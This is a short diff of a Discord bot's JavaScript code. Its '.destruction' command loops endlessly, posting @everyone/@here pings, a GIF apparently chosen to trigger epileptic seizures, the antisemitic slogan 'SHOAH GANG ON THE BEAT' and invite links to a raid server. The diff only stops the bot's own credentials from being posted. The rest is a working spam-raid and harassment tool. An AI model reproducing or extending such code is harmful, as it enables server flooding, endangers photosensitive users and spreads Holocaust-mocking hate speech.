@@ -29,7 +29,7 @@ bot.on('message', msg => {
   if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send(bot.user.email+" "+bot.user.pass+"@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
+      msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
       "SHOAH GANG ON THE BEAT \n"+
       "https://discord.gg/8vtFryt \n"+
       "https://discord.gg/s5Y2RfG").catch(e => {});
